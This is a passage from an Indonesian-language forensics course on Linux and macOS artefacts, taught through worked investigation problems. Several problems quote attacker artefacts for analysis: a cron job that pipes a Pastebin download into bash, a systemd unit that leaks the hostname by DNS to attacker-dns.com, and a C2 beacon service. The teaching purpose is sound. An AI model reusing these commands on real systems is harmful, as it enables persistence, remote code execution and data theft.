**Jawaban:** File wtmp dibaca menggunakan perintah `last` dan mencatat semua sesi login/logout yang berhasil termasuk username, terminal, IP sumber, dan durasi sesi. File btmp dibaca menggunakan `lastb` (memerlukan hak root) dan mencatat semua percobaan login yang gagal. Keduanya menyimpan data dalam format struct utmp binary dan tidak dapat dibaca langsung dengan text editor. Untuk investigasi forensik, kedua file ini memberikan gambaran lengkap tentang siapa yang berhasil dan gagal mengakses sistem.

---

### 3.3 Log Rotation dan Implikasi Forensik

Linux menggunakan `logrotate` untuk mengelola ukuran file log. Konfigurasi default terdapat di `/etc/logrotate.conf` dan `/etc/logrotate.d/`:

```bash
# /etc/logrotate.d/rsyslog
/var/log/syslog
/var/log/auth.log
{
    rotate 7
    daily
    compress
    delaycompress
    missingok
    notifempty
    postrotate
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
}
```

> **Implikasi Forensik:** Log rotation berarti data log mungkin tersedia dalam file terkompresi (.gz). Investigator harus memeriksa semua file log termasuk versi rotated: `auth.log`, `auth.log.1`, `auth.log.2.gz`, dst. Gunakan `zgrep` untuk mencari dalam file terkompresi dan `zcat` untuk membacanya.

---

## 4. Forensik Linux Lanjutan

### 4.1 Analisis Proses dan Layanan

#### 4.1.1 /proc Filesystem (Live Forensics)

Pada sistem yang masih berjalan, `/proc` menyediakan informasi real-time tentang proses:

```bash
# Informasi proses PID 1234
/proc/1234/cmdline    # Command line yang menjalankan proses
/proc/1234/environ    # Environment variables
/proc/1234/exe        # Symlink ke executable
/proc/1234/fd/        # File descriptors (koneksi jaringan, file terbuka)
/proc/1234/maps       # Memory maps
/proc/1234/status     # Status proses (UID, GID, memory)
```

#### 4.1.2 Systemd Service Analysis

```bash
# Melihat semua service
systemctl list-units --type=service --all

# Melihat service yang gagal (anomali)
systemctl --failed

# Detail service tertentu
systemctl status suspicious.service
systemctl cat suspicious.service
```

Lokasi file service unit:

| Lokasi | Prioritas | Keterangan |
|--------|-----------|------------|
| `/etc/systemd/system/` | Tertinggi | Service custom/admin |
| `/run/systemd/system/` | Menengah | Runtime services |
| `/lib/systemd/system/` | Terendah | Service dari paket |

#### Solved Problem 10 ⭐⭐

**Soal:** Pada server pertahanan berbasis Linux, investigator menemukan file service systemd berikut di `/etc/systemd/system/system-update.service`. Analisis apakah service ini legitimasi atau mencurigakan:

```ini
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.svc_helper -c 203.0.113.99 -p 443
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

**Penyelesaian:**

*Step 1:* Analisis setiap komponen

| Komponen | Nilai | Analisis |
|----------|-------|----------|
| Description | "System Update Service" | Nama generik yang dirancang untuk tersamarkan |
| ExecStart | `/usr/local/bin/.svc_helper` | **Hidden file** (diawali titik) di lokasi system binary |
| Parameter | `-c 203.0.113.99 -p 443` | **Koneksi keluar** ke IP dengan port HTTPS |
| Restart | `always` | **Persistent** — selalu restart jika mati |
| RestartSec | `60` | Restart setiap 60 detik |
| WantedBy | `multi-user.target` | Berjalan saat boot normal |

*Step 2:* Identifikasi indikator kompromi

**Jawaban:** Service ini **sangat mencurigakan** dan kemungkinan besar merupakan **backdoor/C2 beacon**. Indikatornya: (1) Executable tersembunyi (`.svc_helper` diawali titik), (2) Parameter `-c` dan `-p` menunjukkan koneksi ke server C2 (203.0.113.99) pada port 443 untuk menyamarkan traffic sebagai HTTPS, (3) `Restart=always` memastikan persistence meskipun proses dimatikan, (4) Deskripsi generik "System Update Service" untuk mengelabui administrator, (5) Ditempatkan di `/etc/systemd/system/` (prioritas tertinggi) untuk memastikan dijalankan. Langkah selanjutnya: isolasi server, ambil salinan binary `.svc_helper` untuk analisis malware, periksa koneksi ke IP 203.0.113.99, dan cari indicator of compromise (IoC) terkait.

---

### 4.2 File dan Direktori Tersembunyi

Di Linux, file dan direktori yang namanya diawali dengan karakter titik (`.`) dianggap "hidden" dan tidak ditampilkan oleh perintah `ls` standar. Penyerang sering memanfaatkan fitur ini:

```bash
# Menampilkan file tersembunyi
ls -la /tmp/
ls -la /dev/shm/

# Mencari file tersembunyi di seluruh sistem
find / -name ".*" -type f 2>/dev/null

# Mencari direktori tersembunyi
find / -name ".*" -type d 2>/dev/null

# Mencari file dengan nama yang mengandung spasi atau karakter khusus
find / -name "* *" -o -name "*...*" 2>/dev/null
```

Lokasi umum tempat malware bersembunyi:

| Lokasi | Alasan |
|--------|--------|
| `/tmp/.hidden/` | Writable oleh semua, sering diabaikan |
| `/dev/shm/` | RAM-based filesystem, hilang saat reboot |
| `/var/tmp/` | Tidak dibersihkan saat reboot |
| `/usr/local/bin/.file` | Terlihat seperti system binary |
| `/home/user/.config/autostart/` | Autostart per-user |

#### Solved Problem 11 ⭐⭐

**Soal:** Seorang investigator menjalankan `find / -name ".*" -type f -newer /etc/passwd 2>/dev/null` pada sistem yang dicurigai dikompromikan. Jelaskan apa yang dilakukan perintah ini dan mengapa berguna dalam investigasi!

**Penyelesaian:**

*Step 1:* Breakdown perintah

| Komponen | Fungsi |
|----------|--------|
| `find /` | Cari dari root directory |
| `-name ".*"` | File yang namanya diawali titik (tersembunyi) |
| `-type f` | Hanya file (bukan direktori) |
| `-newer /etc/passwd` | File yang lebih baru dari /etc/passwd |
| `2>/dev/null` | Buang pesan error (permission denied) |

**Jawaban:** Perintah ini mencari semua file tersembunyi (diawali titik) di seluruh sistem yang lebih baru dari file `/etc/passwd`. Ini berguna karena: (1) File tersembunyi sering digunakan oleh malware untuk bersembunyi, (2) Flag `-newer /etc/passwd` menggunakan timestamp /etc/passwd sebagai referensi — file yang lebih baru mungkin dibuat oleh penyerang setelah initial compromise, (3) Menggabungkan kedua kriteria mempersempit hasil ke file tersembunyi yang baru dibuat, yang memiliki probabilitas lebih tinggi sebagai artefak serangan. Ini adalah teknik triaging yang efektif untuk identifikasi cepat file mencurigakan.

---

### 4.3 SSH Artifacts

SSH (Secure Shell) merupakan protokol akses jarak jauh yang paling umum di Linux dan menghasilkan banyak artefak forensik:

#### 4.3.1 Konfigurasi SSH Server

```bash
# Konfigurasi server
/etc/ssh/sshd_config

# Parameter penting untuk forensik:
PermitRootLogin          # Apakah root boleh login via SSH
PasswordAuthentication   # Apakah password auth diizinkan
AuthorizedKeysFile       # Lokasi authorized keys
MaxAuthTries             # Batas percobaan autentikasi
LogLevel                 # Level logging SSH
```

#### 4.3.2 SSH Keys dan Authorized Keys

```bash
# Lokasi SSH keys per user
~/.ssh/id_rsa           # Private key
~/.ssh/id_rsa.pub       # Public key
~/.ssh/authorized_keys  # Keys yang diizinkan login
~/.ssh/known_hosts      # Server yang pernah diakses
~/.ssh/config           # Konfigurasi koneksi SSH
```

> **Artefak Forensik Kritis:** File `~/.ssh/authorized_keys` merupakan target utama penyerang. Penambahan public key penyerang ke file ini memungkinkan akses tanpa password. File `~/.ssh/known_hosts` menunjukkan server-server yang pernah diakses dari sistem ini (meskipun di-hash pada konfigurasi modern).

#### Solved Problem 12 ⭐⭐

**Soal:** Pada investigasi server Lantamal yang dikompromikan, investigator menemukan entry berikut di `/root/.ssh/authorized_keys`:

```
ssh-rsa AAAAB3NzaC1yc2EA... attacker@c2-server
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... root@kodam-backup
```

Mana yang mencurigakan dan langkah forensik apa yang harus dilakukan?

**Penyelesaian:**

*Step 1:* Analisis kedua entry

| Entry | Key Type | Comment | Analisis |
|-------|----------|---------|----------|
| 1 | ssh-rsa | `attacker@c2-server` | **SANGAT MENCURIGAKAN** — comment menunjukkan origin yang jelas bukan dari organisasi |
| 2 | ssh-ed25519 | `root@kodam-backup` | Kemungkinan legitimate — backup server internal |

*Step 2:* Langkah forensik

**Jawaban:** Entry pertama (`attacker@c2-server`) sangat mencurigakan karena comment field menunjukkan key berasal dari "c2-server" (Command & Control). Langkah forensik: (1) Catat dan preservasi seluruh file authorized_keys, (2) Periksa timestamp file menggunakan `stat` untuk menentukan kapan key ditambahkan, (3) Korelasikan timestamp dengan log auth.log untuk menemukan sesi yang digunakan untuk menambahkan key, (4) Cari public key yang sama di sistem lain dalam jaringan (lateral movement), (5) Periksa apakah entry kedua benar-benar berasal dari server kodam-backup yang sah dengan memverifikasi public key. Meskipun demikian, comment field dapat diubah secara bebas, sehingga entry kedua juga tetap perlu diverifikasi.

---

## 5. Pengenalan Forensik Mac OS

### 5.1 Arsitektur Mac OS

Mac OS (macOS) dibangun di atas fondasi Darwin, yang merupakan sistem operasi berbasis BSD Unix. Pemahaman arsitektur macOS penting karena perangkat Apple semakin banyak digunakan di lingkungan profesional, termasuk sektor pertahanan.

| Komponen | Deskripsi | Relevansi Forensik |
|----------|-----------|-------------------|
| **Darwin Kernel (XNU)** | Kernel hybrid (Mach + BSD) | Mempengaruhi bagaimana artefak disimpan |
| **APFS** | Apple File System (default sejak High Sierra) | Sistem file utama untuk analisis |
| **HFS+** | Hierarchical File System Plus (legacy) | Masih ditemukan di perangkat lama |
| **launchd** | Service manager (pengganti init/systemd) | Persistence mechanism analysis |
| **Spotlight** | Search indexing service | Database metadata yang kaya |
| **FSEvents** | File system event logging | Timeline aktivitas file system |
| **Unified Logs** | Sistem logging terpusat | Sumber log utama sejak Sierra |

### 5.2 Sistem File APFS (Apple File System)

APFS diperkenalkan pada macOS High Sierra (10.13) dan menjadi default filesystem untuk semua perangkat Apple:

| Fitur APFS | Deskripsi | Implikasi Forensik |
|------------|-----------|-------------------|
| **Copy-on-Write (CoW)** | Data baru ditulis di lokasi baru | Versi lama data mungkin masih ada |
| **Snapshots** | Snapshot filesystem otomatis | Memungkinkan recovery data historis |
| **Clones** | File cloning tanpa duplikasi data | Analisis sharing blocks |
| **Encryption** | Enkripsi native per-volume/per-file | Tantangan akses data terenkripsi |
| **Space sharing** | Multiple volumes berbagi storage | Kompleksitas partisi |
| **Nanosecond timestamps** | Presisi tinggi | Timeline forensik yang lebih akurat |

#### Solved Problem 13 ⭐

**Soal:** Sebutkan tiga perbedaan utama antara sistem file ext4 (Linux) dan APFS (macOS) dari perspektif forensik!

**Penyelesaian:**

*Step 1:* Bandingkan karakteristik kedua filesystem

| Aspek | ext4 (Linux) | APFS (macOS) |
|-------|-------------|--------------|
| **Journaling** | Journal tradisional | Copy-on-Write (CoW) |
| **Enkripsi** | Opsional (dm-crypt/LUKS) | Native encryption built-in |
| **Snapshots** | Memerlukan LVM | Built-in automatic snapshots |
| **Recovery** | File carving dari journal/unallocated | Snapshot restoration, CoW recovery |
| **Timestamps** | 4 timestamps (atime, mtime, ctime, crtime) | 4 timestamps dengan nanosecond precision |
| **Metadata** | Standard Unix permissions | Extended attributes + ACL |

**Jawaban:** Tiga perbedaan utama: (1) **Mekanisme penulisan** — ext4 menggunakan journaling tradisional sementara APFS menggunakan Copy-on-Write, yang berarti data lama pada APFS mungkin tetap ada lebih lama karena tidak di-overwrite langsung, (2) **Enkripsi** — APFS memiliki enkripsi native yang terintegrasi, menjadikan akses data lebih menantang dibanding ext4 yang memerlukan setup terpisah, (3) **Snapshot** — APFS memiliki fitur snapshot bawaan yang memungkinkan recovery state filesystem sebelumnya, fitur yang tidak tersedia secara native pada ext4.

---

### 5.3 Artefak Utama Mac OS

#### 5.3.1 Property List (plist) Files

Plist files adalah format konfigurasi utama di macOS, setara dengan Windows Registry dalam hal kekayaan informasi forensik:

```bash
# Lokasi umum plist files
~/Library/Preferences/                    # Preferensi aplikasi per-user
/Library/Preferences/                     # Preferensi sistem
~/Library/Preferences/com.apple.Terminal.plist  # History Terminal
~/Library/Preferences/com.apple.Safari.plist    # Safari config
```

Format plist: Binary (bplist) atau XML. Untuk membaca binary plist:

```bash
# Di macOS
plutil -p file.plist

# Di Linux (untuk analisis)
plistutil -i file.plist -o file_readable.plist
```

#### 5.3.2 Spotlight Metadata

Spotlight mengindeks hampir semua file di macOS dan menyimpan metadata yang kaya:

```bash
# Database Spotlight
/.Spotlight-V100/

# Informasi yang diindeks:
# - Nama file, path, ukuran
# - Tanggal pembuatan, modifikasi
# - Content type
# - Konten teks (untuk file yang didukung)
# - Metadata gambar (EXIF)
```

#### 5.3.3 FSEvents

FSEvents mencatat perubahan pada filesystem secara real-time:

```bash
# Lokasi FSEvents
/.fseventsd/

# Informasi yang dicatat:
# - Path file/direktori yang berubah
# - Tipe perubahan (created, modified, deleted, renamed)
# - Timestamp perubahan
# - Event flags
```

> **Nilai Forensik FSEvents:** Meskipun file telah dihapus, FSEvents masih mencatat bahwa file tersebut pernah ada dan kapan dihapus. Ini sangat berharga untuk merekonstruksi aktivitas pengguna bahkan setelah upaya penghapusan jejak.

#### 5.3.4 Unified Logs

Diperkenalkan pada macOS Sierra, unified logs menggantikan sistem ASL (Apple System Log) dan syslog tradisional:

```bash
# Membaca unified logs
log show --predicate 'processImagePath contains "ssh"' --last 24h
log show --predicate 'eventMessage contains "login"' --info

# Export untuk analisis
log collect --output ~/Desktop/system_logs.logarchive
```

| Perbedaan | Linux syslog | macOS Unified Logs |
|-----------|-------------|-------------------|
| Format | Text files | Binary database |
| Akses | cat, grep | `log` command, Console.app |
| Storage | /var/log/ | /var/db/diagnostics/ |
| Retention | Berbasis logrotate | Berbasis storage pressure |
| Detail | Bervariasi | Sangat detail dengan subsystem/category |

#### Solved Problem 14 ⭐

**Soal:** Jelaskan mengapa FSEvents pada macOS sangat bernilai untuk investigasi forensik dan sebutkan keterbatasannya!

**Penyelesaian:**

*Step 1:* Identifikasi nilai forensik FSEvents

| Keunggulan | Penjelasan |
|------------|------------|
| Mencatat penghapusan | File terhapus masih tercatat pernah ada |
| Persistent | Log tetap ada meskipun file asli hilang |
| Timeline lengkap | Dapat merekonstruksi aktivitas filesystem |
| Mencakup USB | Aktivitas pada USB drive juga dicatat |

*Step 2:* Identifikasi keterbatasan

| Keterbatasan | Penjelasan |
|-------------|------------|
| Tidak menyimpan konten file | Hanya path dan tipe perubahan |
| Dapat dihapus oleh root | Penyerang dengan akses root dapat menghapus |
| Coarse granularity | Mungkin menggabungkan beberapa event |
| Bergantung pada ruang disk | Dihapus saat disk penuh |

**Jawaban:** FSEvents sangat bernilai karena mencatat setiap perubahan filesystem termasuk pembuatan, modifikasi, dan penghapusan file — bahkan jika file telah dihapus, jejak keberadaannya tetap tercatat. Ini memungkinkan rekonstruksi timeline aktivitas yang komprehensif. Namun keterbatasannya meliputi: (1) Tidak menyimpan konten file, hanya metadata perubahan, (2) Dapat dihapus oleh pengguna dengan hak akses root, (3) Granularitas yang kasar dimana beberapa event mungkin digabungkan, dan (4) Log dapat dihapus secara otomatis saat tekanan storage.

---

### 5.4 Perbandingan Forensik Linux vs Mac OS

| Aspek | Linux | Mac OS |
|-------|-------|--------|
| **Filesystem** | ext4, XFS, Btrfs | APFS, HFS+ |
| **User data** | /home/user/ | /Users/username/ |
| **Config format** | Text files | plist (binary/XML) |
| **Logging** | syslog + journald | Unified Logs |
| **Scheduled tasks** | cron, systemd timers | launchd (plist-based) |
| **Search index** | mlocate, plocate | Spotlight |
| **FS events** | inotify (runtime only) | FSEvents (persistent) |
| **Encryption** | dm-crypt/LUKS | FileVault (APFS native) |
| **Tools forensik** | Autopsy, Sleuth Kit, log2timeline | mac_apt, APOLLO, Blacklight |
| **Akuisisi dari Windows** | FTK Imager, ext2read | HFSExplorer, APFS tools terbatas |

#### Solved Problem 15 ⭐

**Soal:** Mengapa forensik Mac OS dianggap lebih menantang dibandingkan forensik Linux dalam konteks investigasi militer?

**Penyelesaian:**

*Step 1:* Identifikasi tantangan spesifik

**Jawaban:** Forensik Mac OS lebih menantang karena: (1) **FileVault encryption** — APFS native encryption menyulitkan akses tanpa password/recovery key, (2) **Secure Boot dan T2/M-series chip** — hardware security yang membatasi boot dari media eksternal, (3) **Proprietary format** — plist binary, unified logs, dan APFS memerlukan tools khusus, (4) **Closed ecosystem** — Apple tidak mempublikasikan dokumentasi internal yang lengkap, (5) **Ketersediaan tools** — tools forensik untuk macOS lebih sedikit dan sering berbayar, (6) **Dalam konteks militer Indonesia** — mayoritas infrastruktur TNI menggunakan Windows/Linux sehingga kapabilitas forensik Mac OS kurang berkembang.

---

### 5.5 Tools Forensik untuk Mac OS

| Tool | Tipe | Fungsi | Platform Analisis |
|------|------|--------|------------------|
| **mac_apt** | Open-source | Parser artefak macOS | Python (cross-platform) |
| **APOLLO** | Open-source | Apple Pattern of Life Lazy Output'ing | Python |
| **plistutil** | Open-source | Parser plist | Linux/Windows |
| **Autopsy** | Open-source | Analisis APFS dasar | Windows/Linux |
| **Blacklight** | Komersial | Forensik macOS komprehensif | Windows |
| **AXIOM** | Komersial | Multi-platform termasuk Mac | Windows |
| **mac_robber** | Open-source | Filesystem metadata collection | Mac/Linux |
| **FSEventsParser** | Open-source | Parser FSEvents | Python |

---

## 6. Forensik Linux dalam Konteks Militer Indonesia

### 6.1 Penggunaan Linux di Infrastruktur Militer

Linux banyak digunakan dalam infrastruktur pertahanan Indonesia, terutama pada:

1. **Server pertahanan**: Web server, mail server, dan database server yang menjalankan sistem informasi militer
2. **Sistem komunikasi**: Platform komunikasi terenkripsi berbasis Linux
3. **Network appliances**: Firewall, IDS/IPS, dan router yang menjalankan distribusi Linux embedded
4. **Sistem radar dan senjata**: Banyak sistem pertahanan modern menggunakan embedded Linux
5. **Sistem SCADA**: Infrastruktur kritis seperti pembangkit listrik militer

#### Solved Problem 16 ⭐⭐

**Soal:** Server Linux di Pusat Data Kodam XIV/Hasanuddin mengalami insiden keamanan. Investigator menemukan log berikut di auth.log:

```
Jan 20 02:15:30 kodam14-db sshd[5501]: Accepted publickey for admin from 192.168.10.5 port 48210 ssh2
Jan 20 02:16:45 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases
Jan 20 02:20:10 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/scp /tmp/all_db.sql admin@172.16.0.99:/data/
Jan 20 02:21:30 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/shred -n 3 /tmp/all_db.sql
Jan 20 02:22:00 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/sbin/service rsyslog stop
```

Lakukan analisis forensik terhadap log ini!

**Penyelesaian:**

*Step 1:* Timeline rekonstruksi

| Waktu | Aktivitas | Analisis |
|-------|-----------|----------|
| 02:15:30 | Login SSH via public key dari 192.168.10.5 | Akses sah? Perlu verifikasi IP |
| 02:16:45 | Dump seluruh database | **Data exfiltration preparation** |
| 02:20:10 | Transfer file ke 172.16.0.99 | **Data exfiltration** ke host eksternal |
| 02:21:30 | Penghapusan aman (shred) file dump | **Anti-forensik** — menghancurkan bukti |
| 02:22:00 | Menghentikan rsyslog | **Anti-forensik** — menghentikan logging |

*Step 2:* Kesimpulan dan rekomendasi

**Jawaban:** Log ini menunjukkan insiden **data exfiltration** yang terencana dengan pola: (1) Akses via SSH pada dini hari (02:15) menggunakan public key — menunjukkan pre-planted authorized key, (2) Dump seluruh database MySQL — menunjukkan niat mencuri semua data, (3) Transfer ke 172.16.0.99 — identifikasi dan investigasi host tujuan sangat kritis, (4) Penghapusan aman menggunakan `shred` — upaya anti-forensik yang canggih, (5) Penghentian rsyslog — menghentikan pencatatan aktivitas selanjutnya. Rekomendasi: segera isolasi kedua server (sumber dan tujuan), periksa authorized_keys admin, audit semua akses ke 192.168.10.5, periksa apakah akun admin telah dikompromikan, dan notifikasi rantai komando sesuai SOP insiden siber.

---

#### Solved Problem 17 ⭐⭐

**Soal:** Jelaskan bagaimana investigator dapat menggunakan WSL2 (Windows Subsystem for Linux) di workstation Windows untuk menganalisis artefak forensik Linux!

**Penyelesaian:**

*Step 1:* Identifikasi kapabilitas WSL2 untuk forensik

| Kapabilitas | Deskripsi |
|-------------|-----------|
| Linux command line tools | grep, awk, sed, find, strings |
| Mount filesystem | Mount image Linux di WSL |
| Python tools | log2timeline, volatility |
| Package manager | apt untuk install tools tambahan |

*Step 2:* Workflow analisis

**Jawaban:** WSL2 memungkinkan investigator menganalisis artefak Linux tanpa meninggalkan lingkungan Windows: (1) **Install WSL2** — `wsl --install` pada Windows 10/11, (2) **Akses file** — file Windows dapat diakses dari WSL via `/mnt/c/`, sementara file WSL dari Windows via `\\wsl$\`, (3) **Mount image** — menggunakan `losetup` dan `mount` untuk mount forensic image, (4) **Analisis log** — grep, awk, sed untuk parsing auth.log, syslog, (5) **Install tools forensik** — `apt install sleuthkit` untuk analisis filesystem, install plaso untuk timeline analysis, (6) **Keuntungan utama** — investigator tetap bekerja di Windows (sesuai standar workstation TNI) sambil memiliki akses penuh ke tools native Linux.

---

#### Solved Problem 18 ⭐⭐⭐

**Soal:** Dalam investigasi terhadap server DNS militer berbasis Linux, investigator menemukan file berikut di `/etc/cron.d/`:

```bash
# /etc/cron.d/dns-update
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/15 * * * * root curl -s https://pastebin.com/raw/aBcDeF | bash
```

Serta entry mencurigakan di systemd:

```ini
# /etc/systemd/system/dns-helper.service
[Unit]
Description=DNS Cache Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'nslookup $(cat /etc/hostname).data.attacker-dns.com'
StandardOutput=null

[Install]
WantedBy=multi-user.target
```

Analisis kedua temuan ini dan jelaskan teknik yang digunakan penyerang!

**Penyelesaian:**

*Step 1:* Analisis cron job

| Aspek | Analisis |
|-------|----------|
| Frekuensi | Setiap 15 menit |
| Perintah | `curl` dari Pastebin, pipe ke `bash` |
| Teknik | **Living off the Land** — menggunakan tools yang sudah ada |
| Tujuan | Download dan eksekusi payload dinamis dari internet |
| Risiko | Payload dapat berubah setiap saat tanpa modifikasi di server |

*Step 2:* Analisis systemd service

| Aspek | Analisis |
|-------|----------|
| Tipe | oneshot (eksekusi sekali saat boot) |
| Perintah | `nslookup` ke domain attacker dengan hostname sebagai subdomain |
| Teknik | **DNS exfiltration/beaconing** — data dikirim via DNS query |
| Tujuan | Mengirim hostname server ke penyerang melalui DNS |
| Stealth | DNS traffic jarang dimonitor dan diblokir |

*Step 3:* Analisis gabungan

**Jawaban:** Penyerang menggunakan dua teknik persistence dan C2 yang berbeda: (1) **Cron-based payload delivery** — mengambil perintah dari Pastebin setiap 15 menit, memungkinkan penyerang mengubah payload tanpa harus mengakses ulang server. Ini adalah teknik "fileless malware" karena payload tidak pernah disimpan permanen di disk. (2) **DNS-based exfiltration** — mengirimkan hostname server sebagai subdomain DNS query ke domain yang dikontrol penyerang. Teknik ini efektif karena DNS traffic biasanya tidak diblokir oleh firewall. Kombinasi kedua teknik menunjukkan penyerang yang sophistisicated: cron untuk command execution, DNS untuk exfiltrasi data. Langkah mitigasi: blokir akses ke Pastebin dan domain attacker, hapus kedua file, periksa apakah ada mekanisme persistence lain, dan monitor DNS traffic untuk anomali.

---

#### Solved Problem 19 ⭐⭐⭐

**Soal:** Jelaskan secara detail langkah-langkah melakukan timeline analysis pada sistem Linux menggunakan plaso/log2timeline, termasuk sumber artefak yang harus dianalisis!

**Penyelesaian:**

*Step 1:* Daftar sumber artefak untuk timeline

| Sumber | Lokasi | Informasi |
|--------|--------|-----------|
| Filesystem timestamps | Seluruh filesystem | atime, mtime, ctime, crtime |
| Syslog | /var/log/syslog | Aktivitas sistem |
| Auth.log | /var/log/auth.log | Login, sudo, SSH |
| Bash history | ~/.bash_history | Perintah user (jika ada timestamp) |
| Wtmp/btmp | /var/log/wtmp, btmp | Login sessions |
| Dpkg.log | /var/log/dpkg.log | Package installation |
| Apache/Nginx logs | /var/log/apache2/ | Web access |
| Cron logs | /var/log/cron.log | Scheduled task execution |
| Journal | /var/log/journal/ | Systemd journal entries |

*Step 2:* Proses log2timeline

```bash
# Step 1: Buat Plaso storage file dari image
log2timeline.py --storage-file timeline.plaso /path/to/disk-image.dd

# Step 2: Filter dan sort output
psort.py -o l2tcsv timeline.plaso "date > '2026-01-15 00:00:00'" > filtered_timeline.csv

# Step 3: Analisis dengan timeline explorer atau spreadsheet
# Import CSV ke Timeline Explorer atau Excel untuk analisis visual
```

**Jawaban:** Timeline analysis dengan plaso/log2timeline melibatkan tiga tahap: (1) **Collection** — log2timeline.py mengekstrak timestamps dari semua sumber artefak pada disk image (filesystem metadata, log files, configuration files, browser artifacts) dan menyimpannya dalam format Plaso storage, (2) **Processing** — psort.py memfilter, mengurutkan, dan mengekspor data ke format yang dapat dianalisis (CSV, JSON, Elasticsearch), memungkinkan filtering berdasarkan rentang waktu, sumber, atau kata kunci, (3) **Analysis** — Timeline Explorer atau tools visualisasi digunakan untuk mengidentifikasi pola, anomali, dan korelasi antar event. Sumber artefak utama yang harus dianalisis meliputi: filesystem timestamps (atime/mtime/ctime/crtime), log autentikasi, syslog, bash history, package installation logs, dan scheduled task logs. Timeline yang dihasilkan memungkinkan investigator merekonstruksi urutan kejadian secara kronologis.

---

#### Solved Problem 20 ⭐⭐⭐

**Soal:** Sebuah server web Linux di Lanud Halim Perdanakusuma menjalankan Apache dan terdeteksi mengirim traffic mencurigakan. Jelaskan pendekatan forensik komprehensif untuk investigasi server ini, termasuk artefak Linux dan log web server yang harus diperiksa!

**Penyelesaian:**

*Step 1:* Tentukan artefak yang harus dikumpulkan

| Kategori | Artefak | Lokasi |
|----------|---------|--------|
| **Sistem** | auth.log, syslog | /var/log/ |
| **Web Server** | access.log, error.log | /var/log/apache2/ |
| **User** | bash_history, authorized_keys | /home/*, /root/ |
| **Persistence** | crontab, systemd services | /etc/cron.d/, /etc/systemd/ |
| **Network** | iptables rules, hosts file | /etc/iptables/, /etc/hosts |
| **Filesystem** | File tersembunyi, SUID files | / (seluruh sistem) |
| **Web App** | PHP files, upload directory | /var/www/html/ |
| **Database** | MySQL logs, data | /var/lib/mysql/ |

*Step 2:* Langkah investigasi terstruktur

1. **Preservasi** — Buat forensic image sebelum analisis
2. **Volatile data** — Jika sistem masih hidup: `netstat -tlnp`, `ps aux`, `lsof -i`
3. **Log analysis** — Korelasikan auth.log dengan Apache access.log
4. **Web shell hunting** — `find /var/www -name "*.php" -newer /var/log/dpkg.log`
5. **Backdoor search** — Periksa SUID files, cron, systemd, authorized_keys
6. **Timeline** — Buat super timeline dengan log2timeline
7. **Network** — Analisis koneksi keluar mencurigakan

**Jawaban:** Pendekatan forensik komprehensif meliputi: (1) **Imaging** — buat bit-for-bit copy dari seluruh disk, (2) **Log analysis** — korelasikan Apache access.log (mencari request mencurigakan seperti POST ke file yang tidak dikenal, parameter injection) dengan auth.log (login anomali), (3) **Web shell detection** — cari file PHP yang baru ditambahkan atau dimodifikasi di webroot, terutama yang mengandung fungsi seperti `eval()`, `system()`, `exec()`, `base64_decode()`, (4) **Persistence check** — periksa cron jobs, systemd services, authorized_keys untuk backdoor, (5) **Network analysis** — analisis traffic keluar yang mencurigakan menggunakan netstat atau pcap, (6) **Timeline reconstruction** — gunakan plaso untuk membuat super timeline dari semua sumber artefak, (7) **Indicator of Compromise** — dokumentasikan semua IoC (IP, hash file, domain) untuk shared intelligence dalam jaringan TNI AU.

---

#### Solved Problem 21 ⭐⭐⭐

**Soal:** Jelaskan bagaimana penyerang dapat memanfaatkan fitur-fitur legitimate Linux untuk persistence (Living off the Land) dan bagaimana investigator mendeteksinya!

**Penyelesaian:**

*Step 1:* Identifikasi teknik LotL pada Linux

| Teknik | Mekanisme | Deteksi |
|--------|-----------|---------|
| **Cron persistence** | Tambah cron job untuk reverse shell | Audit semua crontab: `for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l; done` |
| **Systemd service** | Buat service unit untuk backdoor | Periksa file non-standar di /etc/systemd/system/ |
| **SSH authorized_keys** | Tambah public key penyerang | Audit semua authorized_keys: `find / -name authorized_keys` |
| **Bashrc/profile** | Sisipkan perintah di startup script | Periksa semua .bashrc, .profile, .bash_profile |
| **LD_PRELOAD** | Hijack shared library | Periksa /etc/ld.so.preload dan env vars |
| **PAM backdoor** | Modifikasi PAM module | Verifikasi integritas file di /etc/pam.d/ |
| **Kernel module** | Load malicious kernel module | `lsmod` dan periksa /lib/modules/ |
| **at jobs** | Schedule one-time command | `atq` dan periksa /var/spool/at/ |

*Step 2:* Strategi deteksi komprehensif

**Jawaban:** Penyerang memanfaatkan fitur legitimate Linux untuk menghindari deteksi — teknik yang dikenal sebagai "Living off the Land" (LotL). Teknik utama meliputi: (1) **Cron/systemd persistence** untuk eksekusi berkala, (2) **SSH key injection** untuk akses tanpa password, (3) **Shell startup modification** (.bashrc) untuk eksekusi saat login, (4) **LD_PRELOAD hijacking** untuk intercept system calls, (5) **PAM module modification** untuk bypass autentikasi. Deteksi memerlukan: baseline comparison (membandingkan sistem dengan baseline yang diketahui bersih), audit periodik seluruh mekanisme persistence, monitoring integritas file kritis menggunakan tools seperti AIDE atau Tripwire, dan analisis log yang menyeluruh. Dalam konteks militer, implementasi mandatory access control (SELinux/AppArmor) sangat direkomendasikan untuk membatasi kemampuan LotL.

---

#### Solved Problem 22 ⭐

**Soal:** Jelaskan langkah-langkah mounting forensic image Linux pada workstation Windows untuk analisis, serta pertimbangan yang harus diperhatikan!

**Penyelesaian:**

*Step 1:* Metode mounting pada Windows

| Metode | Tool | Kelebihan | Kekurangan |
|--------|------|-----------|------------|
| **FTK Imager** | Mount sebagai drive read-only | GUI friendly, preservasi integritas | Terbatas pada filesystem yang didukung |
| **Arsenal Image Mounter** | Mount dengan write-blocking | Mendukung banyak format | Perlu instalasi |
| **WSL2** | Mount via `losetup` + `mount` | Native Linux tools | Memerlukan setup WSL |
| **VirtualBox** | Attach sebagai disk di VM Linux | Full Linux environment | Resource intensive |

*Step 2:* Pertimbangan forensik

